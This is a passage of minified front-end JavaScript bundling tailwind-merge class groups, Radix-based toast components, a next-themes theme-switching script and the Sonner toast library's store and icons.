                gap: [{ gap: [m] }],
                "gap-x": [{ "gap-x": [m] }],
                "gap-y": [{ "gap-y": [m] }],
                "justify-content": [{ justify: ["normal", ...E()] }],
                "justify-items": [{ "justify-items": ["start", "end", "center", "stretch"] }],
                "justify-self": [{ "justify-self": ["auto", "start", "end", "center", "stretch"] }],
                "align-content": [{ content: ["normal", ...E(), "baseline"] }],
                "align-items": [{ items: ["start", "end", "center", "baseline", "stretch"] }],
                "align-self": [{ self: ["auto", "start", "end", "center", "stretch", "baseline"] }],
                "place-content": [{ "place-content": [...E(), "baseline"] }],
                "place-items": [{ "place-items": ["start", "end", "center", "baseline", "stretch"] }],
                "place-self": [{ "place-self": ["auto", "start", "end", "center", "stretch"] }],
                p: [{ p: [h] }],
                px: [{ px: [h] }],
                py: [{ py: [h] }],
                ps: [{ ps: [h] }],
                pe: [{ pe: [h] }],
                pt: [{ pt: [h] }],
                pr: [{ pr: [h] }],
                pb: [{ pb: [h] }],
                pl: [{ pl: [h] }],
                m: [{ m: [w] }],
                mx: [{ mx: [w] }],
                my: [{ my: [w] }],
                ms: [{ ms: [w] }],
                me: [{ me: [w] }],
                mt: [{ mt: [w] }],
                mr: [{ mr: [w] }],
                mb: [{ mb: [w] }],
                ml: [{ ml: [w] }],
                "space-x": [{ "space-x": [P] }],
                "space-x-reverse": ["space-x-reverse"],
                "space-y": [{ "space-y": [P] }],
                "space-y-reverse": ["space-y-reverse"],
                w: [{ w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", Q, t] }],
                "min-w": [{ "min-w": [Q, t, "min", "max", "fit"] }],
                "max-w": [{ "max-w": [Q, t, "none", "full", "min", "max", "fit", "prose", { screen: [An] }, An] }],
                h: [{ h: [Q, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"] }],
                "min-h": [{ "min-h": [Q, t, "min", "max", "fit", "svh", "lvh", "dvh"] }],
                "max-h": [{ "max-h": [Q, t, "min", "max", "fit", "svh", "lvh", "dvh"] }],
                size: [{ size: [Q, t, "auto", "min", "max", "fit"] }],
                "font-size": [{ text: ["base", An, Tn] }],
                "font-smoothing": ["antialiased", "subpixel-antialiased"],
                "font-style": ["italic", "not-italic"],
                "font-weight": [
                    {
                        font: [
                            "thin",
                            "extralight",
                            "light",
                            "normal",
                            "medium",
                            "semibold",
                            "bold",
                            "extrabold",
                            "black",
                            El,
                        ],
                    },
                ],
                "font-family": [{ font: [Vo] }],
                "fvn-normal": ["normal-nums"],
                "fvn-ordinal": ["ordinal"],
                "fvn-slashed-zero": ["slashed-zero"],
                "fvn-figure": ["lining-nums", "oldstyle-nums"],
                "fvn-spacing": ["proportional-nums", "tabular-nums"],
                "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
                tracking: [{ tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", Q] }],
                "line-clamp": [{ "line-clamp": ["none", so, El] }],
                leading: [{ leading: ["none", "tight", "snug", "normal", "relaxed", "loose", rn, Q] }],
                "list-image": [{ "list-image": ["none", Q] }],
                "list-style-type": [{ list: ["none", "disc", "decimal", Q] }],
                "list-style-position": [{ list: ["inside", "outside"] }],
                "placeholder-color": [{ placeholder: [e] }],
                "placeholder-opacity": [{ "placeholder-opacity": [g] }],
                "text-alignment": [{ text: ["left", "center", "right", "justify", "start", "end"] }],
                "text-color": [{ text: [e] }],
                "text-opacity": [{ "text-opacity": [g] }],
                "text-decoration": ["underline", "overline", "line-through", "no-underline"],
                "text-decoration-style": [{ decoration: [...H(), "wavy"] }],
                "text-decoration-thickness": [{ decoration: ["auto", "from-font", rn, Tn] }],
                "underline-offset": [{ "underline-offset": ["auto", rn, Q] }],
                "text-decoration-color": [{ decoration: [e] }],
                "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
                "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
                "text-wrap": [{ text: ["wrap", "nowrap", "balance", "pretty"] }],
                indent: [{ indent: F() }],
                "vertical-align": [
                    { align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", Q] },
                ],
                whitespace: [{ whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"] }],
                break: [{ break: ["normal", "words", "all", "keep"] }],
                hyphens: [{ hyphens: ["none", "manual", "auto"] }],
                content: [{ content: ["none", Q] }],
                "bg-attachment": [{ bg: ["fixed", "local", "scroll"] }],
                "bg-clip": [{ "bg-clip": ["border", "padding", "content", "text"] }],
                "bg-opacity": [{ "bg-opacity": [g] }],
                "bg-origin": [{ "bg-origin": ["border", "padding", "content"] }],
                "bg-position": [{ bg: [...X(), rw] }],
                "bg-repeat": [{ bg: ["no-repeat", { repeat: ["", "x", "y", "round", "space"] }] }],
                "bg-size": [{ bg: ["auto", "cover", "contain", nw] }],
                "bg-image": [{ bg: ["none", { "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"] }, iw] }],
                "bg-color": [{ bg: [e] }],
                "gradient-from-pos": [{ from: [S] }],
                "gradient-via-pos": [{ via: [S] }],
                "gradient-to-pos": [{ to: [S] }],
                "gradient-from": [{ from: [f] }],
                "gradient-via": [{ via: [f] }],
                "gradient-to": [{ to: [f] }],
                rounded: [{ rounded: [i] }],
                "rounded-s": [{ "rounded-s": [i] }],
                "rounded-e": [{ "rounded-e": [i] }],
                "rounded-t": [{ "rounded-t": [i] }],
                "rounded-r": [{ "rounded-r": [i] }],
                "rounded-b": [{ "rounded-b": [i] }],
                "rounded-l": [{ "rounded-l": [i] }],
                "rounded-ss": [{ "rounded-ss": [i] }],
                "rounded-se": [{ "rounded-se": [i] }],
                "rounded-ee": [{ "rounded-ee": [i] }],
                "rounded-es": [{ "rounded-es": [i] }],
                "rounded-tl": [{ "rounded-tl": [i] }],
                "rounded-tr": [{ "rounded-tr": [i] }],
                "rounded-br": [{ "rounded-br": [i] }],
                "rounded-bl": [{ "rounded-bl": [i] }],
                "border-w": [{ border: [a] }],
                "border-w-x": [{ "border-x": [a] }],
                "border-w-y": [{ "border-y": [a] }],
                "border-w-s": [{ "border-s": [a] }],
                "border-w-e": [{ "border-e": [a] }],
                "border-w-t": [{ "border-t": [a] }],
                "border-w-r": [{ "border-r": [a] }],
                "border-w-b": [{ "border-b": [a] }],
                "border-w-l": [{ "border-l": [a] }],
                "border-opacity": [{ "border-opacity": [g] }],
                "border-style": [{ border: [...H(), "hidden"] }],
                "divide-x": [{ "divide-x": [a] }],
                "divide-x-reverse": ["divide-x-reverse"],
                "divide-y": [{ "divide-y": [a] }],
                "divide-y-reverse": ["divide-y-reverse"],
                "divide-opacity": [{ "divide-opacity": [g] }],
                "divide-style": [{ divide: H() }],
                "border-color": [{ border: [o] }],
                "border-color-x": [{ "border-x": [o] }],
                "border-color-y": [{ "border-y": [o] }],
                "border-color-s": [{ "border-s": [o] }],
                "border-color-e": [{ "border-e": [o] }],
                "border-color-t": [{ "border-t": [o] }],
                "border-color-r": [{ "border-r": [o] }],
                "border-color-b": [{ "border-b": [o] }],
                "border-color-l": [{ "border-l": [o] }],
                "divide-color": [{ divide: [o] }],
                "outline-style": [{ outline: ["", ...H()] }],
                "outline-offset": [{ "outline-offset": [rn, Q] }],
                "outline-w": [{ outline: [rn, Tn] }],
                "outline-color": [{ outline: [e] }],
                "ring-w": [{ ring: G() }],
                "ring-w-inset": ["ring-inset"],
                "ring-color": [{ ring: [e] }],
                "ring-opacity": [{ "ring-opacity": [g] }],
                "ring-offset-w": [{ "ring-offset": [rn, Tn] }],
                "ring-offset-color": [{ "ring-offset": [e] }],
                shadow: [{ shadow: ["", "inner", "none", An, sw] }],
                "shadow-color": [{ shadow: [Vo] }],
                opacity: [{ opacity: [g] }],
                "mix-blend": [{ "mix-blend": [...$(), "plus-lighter", "plus-darker"] }],
                "bg-blend": [{ "bg-blend": $() }],
                filter: [{ filter: ["", "none"] }],
                blur: [{ blur: [n] }],
                brightness: [{ brightness: [r] }],
                contrast: [{ contrast: [c] }],
                "drop-shadow": [{ "drop-shadow": ["", "none", An, Q] }],
                grayscale: [{ grayscale: [u] }],
                "hue-rotate": [{ "hue-rotate": [d] }],
                invert: [{ invert: [p] }],
                saturate: [{ saturate: [v] }],
                sepia: [{ sepia: [k] }],
                "backdrop-filter": [{ "backdrop-filter": ["", "none"] }],
                "backdrop-blur": [{ "backdrop-blur": [n] }],
                "backdrop-brightness": [{ "backdrop-brightness": [r] }],
                "backdrop-contrast": [{ "backdrop-contrast": [c] }],
                "backdrop-grayscale": [{ "backdrop-grayscale": [u] }],
                "backdrop-hue-rotate": [{ "backdrop-hue-rotate": [d] }],
                "backdrop-invert": [{ "backdrop-invert": [p] }],
                "backdrop-opacity": [{ "backdrop-opacity": [g] }],
                "backdrop-saturate": [{ "backdrop-saturate": [v] }],
                "backdrop-sepia": [{ "backdrop-sepia": [k] }],
                "border-collapse": [{ border: ["collapse", "separate"] }],
                "border-spacing": [{ "border-spacing": [s] }],
                "border-spacing-x": [{ "border-spacing-x": [s] }],
                "border-spacing-y": [{ "border-spacing-y": [s] }],
                "table-layout": [{ table: ["auto", "fixed"] }],
                caption: [{ caption: ["top", "bottom"] }],
                transition: [{ transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", Q] }],
                duration: [{ duration: V() }],
                ease: [{ ease: ["linear", "in", "out", "in-out", Q] }],
                delay: [{ delay: V() }],
                animate: [{ animate: ["none", "spin", "ping", "pulse", "bounce", Q] }],
                transform: [{ transform: ["", "gpu", "none"] }],
                scale: [{ scale: [b] }],
                "scale-x": [{ "scale-x": [b] }],
                "scale-y": [{ "scale-y": [b] }],
                rotate: [{ rotate: [$o, Q] }],
                "translate-x": [{ "translate-x": [A] }],
                "translate-y": [{ "translate-y": [A] }],
                "skew-x": [{ "skew-x": [C] }],
                "skew-y": [{ "skew-y": [C] }],
                "transform-origin": [
                    {
                        origin: [
                            "center",
                            "top",
                            "top-right",
                            "right",
                            "bottom-right",
                            "bottom",
                            "bottom-left",
                            "left",
                            "top-left",
                            Q,
                        ],
                    },
                ],
                accent: [{ accent: ["auto", e] }],
                appearance: [{ appearance: ["none", "auto"] }],
                cursor: [
                    {
                        cursor: [
                            "auto",
                            "default",
                            "pointer",
                            "wait",
                            "text",
                            "move",
                            "help",
                            "not-allowed",
                            "none",
                            "context-menu",
                            "progress",
                            "cell",
                            "crosshair",
                            "vertical-text",
                            "alias",
                            "copy",
                            "no-drop",
                            "grab",
                            "grabbing",
                            "all-scroll",
                            "col-resize",
                            "row-resize",
                            "n-resize",
                            "e-resize",
                            "s-resize",
                            "w-resize",
                            "ne-resize",
                            "nw-resize",
                            "se-resize",
                            "sw-resize",
                            "ew-resize",
                            "ns-resize",
                            "nesw-resize",
                            "nwse-resize",
                            "zoom-in",
                            "zoom-out",
                            Q,
                        ],
                    },
                ],
                "caret-color": [{ caret: [e] }],
                "pointer-events": [{ "pointer-events": ["none", "auto"] }],
                resize: [{ resize: ["none", "y", "x", ""] }],
                "scroll-behavior": [{ scroll: ["auto", "smooth"] }],
                "scroll-m": [{ "scroll-m": F() }],
                "scroll-mx": [{ "scroll-mx": F() }],
                "scroll-my": [{ "scroll-my": F() }],
                "scroll-ms": [{ "scroll-ms": F() }],
                "scroll-me": [{ "scroll-me": F() }],
                "scroll-mt": [{ "scroll-mt": F() }],
                "scroll-mr": [{ "scroll-mr": F() }],
                "scroll-mb": [{ "scroll-mb": F() }],
                "scroll-ml": [{ "scroll-ml": F() }],
                "scroll-p": [{ "scroll-p": F() }],
                "scroll-px": [{ "scroll-px": F() }],
                "scroll-py": [{ "scroll-py": F() }],
                "scroll-ps": [{ "scroll-ps": F() }],
                "scroll-pe": [{ "scroll-pe": F() }],
                "scroll-pt": [{ "scroll-pt": F() }],
                "scroll-pr": [{ "scroll-pr": F() }],
                "scroll-pb": [{ "scroll-pb": F() }],
                "scroll-pl": [{ "scroll-pl": F() }],
                "snap-align": [{ snap: ["start", "end", "center", "align-none"] }],
                "snap-stop": [{ snap: ["normal", "always"] }],
                "snap-type": [{ snap: ["none", "x", "y", "both"] }],
                "snap-strictness": [{ snap: ["mandatory", "proximity"] }],
                touch: [{ touch: ["auto", "none", "manipulation"] }],
                "touch-x": [{ "touch-pan": ["x", "left", "right"] }],
                "touch-y": [{ "touch-pan": ["y", "up", "down"] }],
                "touch-pz": ["touch-pinch-zoom"],
                select: [{ select: ["none", "text", "all", "auto"] }],
                "will-change": [{ "will-change": ["auto", "scroll", "contents", "transform", Q] }],
                fill: [{ fill: [e, "none"] }],
                "stroke-w": [{ stroke: [rn, Tn, El] }],
                stroke: [{ stroke: [e, "none"] }],
                sr: ["sr-only", "not-sr-only"],
                "forced-color-adjust": [{ "forced-color-adjust": ["auto", "none"] }],
            },
            conflictingClassGroups: {
                overflow: ["overflow-x", "overflow-y"],
                overscroll: ["overscroll-x", "overscroll-y"],
                inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
                "inset-x": ["right", "left"],
                "inset-y": ["top", "bottom"],
                flex: ["basis", "grow", "shrink"],
                gap: ["gap-x", "gap-y"],
                p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
                px: ["pr", "pl"],
                py: ["pt", "pb"],
                m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
                mx: ["mr", "ml"],
                my: ["mt", "mb"],
                size: ["w", "h"],
                "font-size": ["leading"],
                "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
                "fvn-ordinal": ["fvn-normal"],
                "fvn-slashed-zero": ["fvn-normal"],
                "fvn-figure": ["fvn-normal"],
                "fvn-spacing": ["fvn-normal"],
                "fvn-fraction": ["fvn-normal"],
                "line-clamp": ["display", "overflow"],
                rounded: [
                    "rounded-s",
                    "rounded-e",
                    "rounded-t",
                    "rounded-r",
                    "rounded-b",
                    "rounded-l",
                    "rounded-ss",
                    "rounded-se",
                    "rounded-ee",
                    "rounded-es",
                    "rounded-tl",
                    "rounded-tr",
                    "rounded-br",
                    "rounded-bl",
                ],
                "rounded-s": ["rounded-ss", "rounded-es"],
                "rounded-e": ["rounded-se", "rounded-ee"],
                "rounded-t": ["rounded-tl", "rounded-tr"],
                "rounded-r": ["rounded-tr", "rounded-br"],
                "rounded-b": ["rounded-br", "rounded-bl"],
                "rounded-l": ["rounded-tl", "rounded-bl"],
                "border-spacing": ["border-spacing-x", "border-spacing-y"],
                "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
                "border-w-x": ["border-w-r", "border-w-l"],
                "border-w-y": ["border-w-t", "border-w-b"],
                "border-color": [
                    "border-color-s",
                    "border-color-e",
                    "border-color-t",
                    "border-color-r",
                    "border-color-b",
                    "border-color-l",
                ],
                "border-color-x": ["border-color-r", "border-color-l"],
                "border-color-y": ["border-color-t", "border-color-b"],
                "scroll-m": [
                    "scroll-mx",
                    "scroll-my",
                    "scroll-ms",
                    "scroll-me",
                    "scroll-mt",
                    "scroll-mr",
                    "scroll-mb",
                    "scroll-ml",
                ],
                "scroll-mx": ["scroll-mr", "scroll-ml"],
                "scroll-my": ["scroll-mt", "scroll-mb"],
                "scroll-p": [
                    "scroll-px",
                    "scroll-py",
                    "scroll-ps",
                    "scroll-pe",
                    "scroll-pt",
                    "scroll-pr",
                    "scroll-pb",
                    "scroll-pl",
                ],
                "scroll-px": ["scroll-pr", "scroll-pl"],
                "scroll-py": ["scroll-pt", "scroll-pb"],
                touch: ["touch-x", "touch-y", "touch-pz"],
                "touch-x": ["touch"],
                "touch-y": ["touch"],
                "touch-pz": ["touch"],
            },
            conflictingClassGroupModifiers: { "font-size": ["leading"] },
        };
    },
    dw = Kx(uw);
function Ir(...e) {
    return dw(cg(e));
}
const pw = rx,
    jg = x.forwardRef(({ className: e, ...t }, n) =>
        l.jsx(ng, {
            ref: n,
            className: Ir(
                "fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",
                e
            ),
            ...t,
        })
    );
jg.displayName = ng.displayName;
const fw = ox(
        "group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full",
        {
            variants: {
                variant: {
                    default: "border bg-background text-foreground",
                    destructive: "destructive group border-destructive bg-destructive text-destructive-foreground",
                },
            },
            defaultVariants: { variant: "default" },
        }
    ),
    Rg = x.forwardRef(({ className: e, variant: t, ...n }, r) =>
        l.jsx(rg, { ref: r, className: Ir(fw({ variant: t }), e), ...n })
    );
Rg.displayName = rg.displayName;
const mw = x.forwardRef(({ className: e, ...t }, n) =>
    l.jsx(sg, {
        ref: n,
        className: Ir(
            "inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors group-[.destructive]:border-muted/40 hover:bg-secondary group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 group-[.destructive]:focus:ring-destructive disabled:pointer-events-none disabled:opacity-50",
            e
        ),
        ...t,
    })
);
mw.displayName = sg.displayName;
const Mg = x.forwardRef(({ className: e, ...t }, n) =>
    l.jsx(ag, {
        ref: n,
        className: Ir(
            "absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity group-hover:opacity-100 group-[.destructive]:text-red-300 hover:text-foreground group-[.destructive]:hover:text-red-50 focus:opacity-100 focus:outline-none focus:ring-2 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",
            e
        ),
        "toast-close": "",
        ...t,
        children: l.jsx(la, { className: "h-4 w-4" }),
    })
);
Mg.displayName = ag.displayName;
const Ig = x.forwardRef(({ className: e, ...t }, n) =>
    l.jsx(og, { ref: n, className: Ir("text-sm font-semibold", e), ...t })
);
Ig.displayName = og.displayName;
const Lg = x.forwardRef(({ className: e, ...t }, n) =>
    l.jsx(ig, { ref: n, className: Ir("text-sm opacity-90", e), ...t })
);
Lg.displayName = ig.displayName;
function hw() {
    const { toasts: e } = dv();
    return l.jsxs(pw, {
        children: [
            e.map(function ({ id: t, title: n, description: r, action: o, ...i }) {
                return l.jsxs(
                    Rg,
                    {
                        ...i,
                        children: [
                            l.jsxs("div", {
                                className: "grid gap-1",
                                children: [n && l.jsx(Ig, { children: n }), r && l.jsx(Lg, { children: r })],
                            }),
                            o,
                            l.jsx(Mg, {}),
                        ],
                    },
                    t
                );
            }),
            l.jsx(jg, {}),
        ],
    });
}
var Dp = ["light", "dark"],
    gw = "(prefers-color-scheme: dark)",
    yw = x.createContext(void 0),
    vw = { setTheme: (e) => {}, themes: [] },
    xw = () => {
        var e;
        return (e = x.useContext(yw)) != null ? e : vw;
    };
x.memo(
    ({
        forcedTheme: e,
        storageKey: t,
        attribute: n,
        enableSystem: r,
        enableColorScheme: o,
        defaultTheme: i,
        value: s,
        attrs: a,
        nonce: c,
    }) => {
        let u = i === "system",
            d =
                n === "class"
                    ? `var d=document.documentElement,c=d.classList;${`c.remove(${a.map((S) => `'${S}'`).join(",")})`};`
                    : `var d=document.documentElement,n='${n}',s='setAttribute';`,
            p = o
                ? Dp.includes(i) && i
                    ? `if(e==='light'||e==='dark'||!e)d.style.colorScheme=e||'${i}'`
                    : "if(e==='light'||e==='dark')d.style.colorScheme=e"
                : "",
            m = (S, y = !1, w = !0) => {
                let g = s ? s[S] : S,
                    h = y ? S + "|| ''" : `'${g}'`,
                    v = "";
                return (
                    o && w && !y && Dp.includes(S) && (v += `d.style.colorScheme = '${S}';`),
                    n === "class" ? (y || g ? (v += `c.add(${h})`) : (v += "null")) : g && (v += `d[s](n,${h})`),
                    v
                );
            },
            f = e
                ? `!function(){${d}${m(e)}}()`
                : r
                  ? `!function(){try{${d}var e=localStorage.getItem('${t}');if('system'===e||(!e&&${u})){var t='${gw}',m=window.matchMedia(t);if(m.media!==t||m.matches){${m("dark")}}else{${m("light")}}}else if(e){${s ? `var x=${JSON.stringify(s)};` : ""}${m(s ? "x[e]" : "e", !0)}}${u ? "" : "else{" + m(i, !1, !1) + "}"}${p}}catch(e){}}()`
                  : `!function(){try{${d}var e=localStorage.getItem('${t}');if(e){${s ? `var x=${JSON.stringify(s)};` : ""}${m(s ? "x[e]" : "e", !0)}}else{${m(i, !1, !1)};}${p}}catch(t){}}();`;
        return x.createElement("script", { nonce: c, dangerouslySetInnerHTML: { __html: f } });
    }
);
var ww = (e) => {
        switch (e) {
            case "success":
                return kw;
            case "info":
                return Pw;
            case "warning":
                return Cw;
            case "error":
                return Ew;
            default:
                return null;
        }
    },
    Sw = Array(12).fill(0),
    bw = ({ visible: e, className: t }) =>
        R.createElement(
            "div",
            { className: ["sonner-loading-wrapper", t].filter(Boolean).join(" "), "data-visible": e },
            R.createElement(
                "div",
                { className: "sonner-spinner" },
                Sw.map((n, r) => R.createElement("div", { className: "sonner-loading-bar", key: `spinner-bar-${r}` }))
            )
        ),
    kw = R.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        R.createElement("path", {
            fillRule: "evenodd",
            d: "M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z",
            clipRule: "evenodd",
        })
    ),
    Cw = R.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 24 24", fill: "currentColor", height: "20", width: "20" },
        R.createElement("path", {
            fillRule: "evenodd",
            d: "M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z",
            clipRule: "evenodd",
        })
    ),
    Pw = R.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        R.createElement("path", {
            fillRule: "evenodd",
            d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z",
            clipRule: "evenodd",
        })
    ),
    Ew = R.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        R.createElement("path", {
            fillRule: "evenodd",
            d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-5a.75.75 0 01.75.75v4.5a.75.75 0 01-1.5 0v-4.5A.75.75 0 0110 5zm0 10a1 1 0 100-2 1 1 0 000 2z",
            clipRule: "evenodd",
        })
    ),
    Nw = R.createElement(
        "svg",
        {
            xmlns: "http://www.w3.org/2000/svg",
            width: "12",
            height: "12",
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "1.5",
            strokeLinecap: "round",
            strokeLinejoin: "round",
        },
        R.createElement("line", { x1: "18", y1: "6", x2: "6", y2: "18" }),
        R.createElement("line", { x1: "6", y1: "6", x2: "18", y2: "18" })
    ),
    Tw = () => {
        let [e, t] = R.useState(document.hidden);
        return (
            R.useEffect(() => {
                let n = () => {
                    t(document.hidden);
                };
                return (
                    document.addEventListener("visibilitychange", n),
                    () => window.removeEventListener("visibilitychange", n)
                );
            }, []),
            e
        );
    },
    Lc = 1,
    Aw = class {
        constructor() {
            (this.subscribe = (e) => (
                this.subscribers.push(e),
                () => {
                    let t = this.subscribers.indexOf(e);
                    this.subscribers.splice(t, 1);
                }
            )),
                (this.publish = (e) => {
                    this.subscribers.forEach((t) => t(e));
                }),
                (this.addToast = (e) => {
                    this.publish(e), (this.toasts = [...this.toasts, e]);
                }),
                (this.create = (e) => {
                    var t;
                    let { message: n, ...r } = e,
                        o =
                            typeof (e == null ? void 0 : e.id) == "number" ||
                            ((t = e.id) == null ? void 0 : t.length) > 0
                                ? e.id
                                : Lc++,
                        i = this.toasts.find((a) => a.id === o),
                        s = e.dismissible === void 0 ? !0 : e.dismissible;
                    return (
                        this.dismissedToasts.has(o) && this.dismissedToasts.delete(o),
                        i
                            ? (this.toasts = this.toasts.map((a) =>
                                  a.id === o
                                      ? (this.publish({ ...a, ...e, id: o, title: n }),
                                        { ...a, ...e, id: o, dismissible: s, title: n })
                                      : a
                              ))
                            : this.addToast({ title: n, ...r, dismissible: s, id: o }),
                        o
                    );
                }),
                (this.dismiss = (e) => (
                    this.dismissedToasts.add(e),
                    e ||
                        this.toasts.forEach((t) => {
                            this.subscribers.forEach((n) => n({ id: t.id, dismiss: !0 }));
                        }),
                    this.subscribers.forEach((t) => t({ id: e, dismiss: !0 })),
                    e
                )),
                (this.message = (e, t) => this.create({ ...t, message: e })),
                (this.error = (e, t) => this.create({ ...t, message: e, type: "error" })),
                (this.success = (e, t) => this.create({ ...t, type: "success", message: e })),
                (this.info = (e, t) => this.create({ ...t, type: "info", message: e })),
                (this.warning = (e, t) => this.create({ ...t, type: "warning", message: e })),
                (this.loading = (e, t) => this.create({ ...t, type: "loading", message: e })),
                (this.promise = (e, t) => {
                    if (!t) return;
                    let n;
                    t.loading !== void 0 &&
                        (n = this.create({
                            ...t,
                            promise: e,
                            type: "loading",
                            message: t.loading,
                            description: typeof t.description != "function" ? t.description : void 0,
                        }));
                    let r = e instanceof Promise ? e : e(),
                        o = n !== void 0,
                        i,
                        s = r
                            .then(async (c) => {
                                if (((i = ["resolve", c]), R.isValidElement(c)))
                                    (o = !1), this.create({ id: n, type: "default", message: c });
                                else if (Rw(c) && !c.ok) {
                                    o = !1;
                                    let u =
                                            typeof t.error == "function"
                                                ? await t.error(`HTTP error! status: ${c.status}`)
                                                : t.error,
                                        d =
                                            typeof t.description == "function"
                                                ? await t.description(`HTTP error! status: ${c.status}`)
                                                : t.description;
                                    this.create({ id: n, type: "error", message: u, description: d });
                                } else if (t.success !== void 0) {
                                    o = !1;
                                    let u = typeof t.success == "function" ? await t.success(c) : t.success,
                                        d = typeof t.description == "function" ? await t.description(c) : t.description;
                                    this.create({ id: n, type: "success", message: u, description: d });
                                }
                            })
                            .catch(async (c) => {
                                if (((i = ["reject", c]), t.error !== void 0)) {
                                    o = !1;
                                    let u = typeof t.error == "function" ? await t.error(c) : t.error,
                                        d = typeof t.description == "function" ? await t.description(c) : t.description;
                                    this.create({ id: n, type: "error", message: u, description: d });
                                }
                            })
                            .finally(() => {
                                var c;
                                o && (this.dismiss(n), (n = void 0)), (c = t.finally) == null || c.call(t);
                            }),
                        a = () => new Promise((c, u) => s.then(() => (i[0] === "reject" ? u(i[1]) : c(i[1]))).catch(u));
                    return typeof n != "string" && typeof n != "number"
                        ? { unwrap: a }
                        : Object.assign(n, { unwrap: a });
                }),
                (this.custom = (e, t) => {
                    let n = (t == null ? void 0 : t.id) || Lc++;
                    return this.create({ jsx: e(n), id: n, ...t }), n;
                }),
                (this.getActiveToasts = () => this.toasts.filter((e) => !this.dismissedToasts.has(e.id))),
                (this.subscribers = []),
                (this.toasts = []),
                (this.dismissedToasts = new Set());
        }
    },
    Qe = new Aw(),
    jw = (e, t) => {
        let n = (t == null ? void 0 : t.id) || Lc++;
        return Qe.addToast({ title: e, ...t, id: n }), n;
    },
    Rw = (e) =>
        e &&
        typeof e == "object" &&
        "ok" in e &&
        typeof e.ok == "boolean" &&
        "status" in e &&
        typeof e.status == "number",
    Mw = jw,
    Iw = () => Qe.toasts,
    Lw = () => Qe.getActiveToasts();
Object.assign(
    Mw,
    {
        success: Qe.success,
        info: Qe.info,
        warning: Qe.warning,
        error: Qe.error,
        custom: Qe.custom,
        message: Qe.message,
        promise: Qe.promise,
        dismiss: Qe.dismiss,
        loading: Qe.loading,
    },
    { getHistory: Iw, getToasts: Lw }
);
function Dw(e, { insertAt: t } = {}) {
    if (typeof document > "u") return;
    let n = document.head || document.getElementsByTagName("head")[0],
        r = document.createElement("style");
    (r.type = "text/css"),
        t === "top" && n.firstChild ? n.insertBefore(r, n.firstChild) : n.appendChild(r),
        r.styleSheet ? (r.styleSheet.cssText = e) : r.appendChild(document.createTextNode(e));
}
